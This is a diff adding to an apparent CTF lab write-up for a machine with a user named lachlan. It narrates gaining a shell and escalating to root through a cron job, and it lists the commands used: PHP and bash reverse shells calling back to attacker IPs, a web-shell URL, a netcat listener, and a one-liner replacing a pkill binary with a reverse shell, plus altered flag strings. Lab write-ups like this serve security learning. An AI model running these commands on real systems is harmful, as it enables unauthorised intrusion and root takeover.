@@ -33,7 +33,16 @@ the whole command which worked and it worked and i got the shell with help of ne
 
 Part 03: - Privlage Escalation
 
-
+i gain shell with help of bash -i i got the access from which i gained shell after which transferring to /home/lachlan i got the 
+user.txt and trying to root was painful.I check bothe sudo and suid privlage escalation which did not worked. 
+So i tried crontabs which i could find anything usefull which also couldnt be used escalate privilage. So I checked the writeup for
+root hint then i learned to check the .bash_history and i got the password for the ssh. So i tried accessing the ssh which failed 
+so after checking /bin i saw backup.sh and which i checked but was just a normal text saying “# todo:  pita website backup as 
+requested by her majesty" which was a confusing so i decided to check the other text showcasing the crontab named persistance
+which was running perdoically. After some research i learned that the root was periodically closing the ssh and crontab was behond
+the failure which means if i insert a reverse shell command in ssh before shutting down that would be a root. 
+So with help of Pentest Monkey and ChatGPt i got the command which would work so i used that command and 
+it worked with help of same netcat command i got the root shell which gave me the root.txt in /root folder.
 
 Commands Used: -
 
@@ -48,3 +57,11 @@ http://MachineIP/cvs/shell.pdf.php?cmd=php -r '$sock=fsockopen("YOUR IP",PORT);e
 Reverse shell: - php -r '$sock=fsockopen("10.9.188.150",443);exec("/bin/sh -i <&3 >&3 2>&3");'
 
 Netcat: - nc -lnvp PORT
+
+Root: - echo "bash -c 'bash -i >& /dev/tcp/10.8.188.150/9001 0>&1'" > bin/pkill ; chmod  +x bin/pkill
+
+Flags : - (Flags have been altered to avoid cheating)
+
+user.txt: - thm{af7e46b68081d4025c5ce10852430617}
+
+root.txt: - thm{7b708e5224f666d3562647816ee2c1d4}
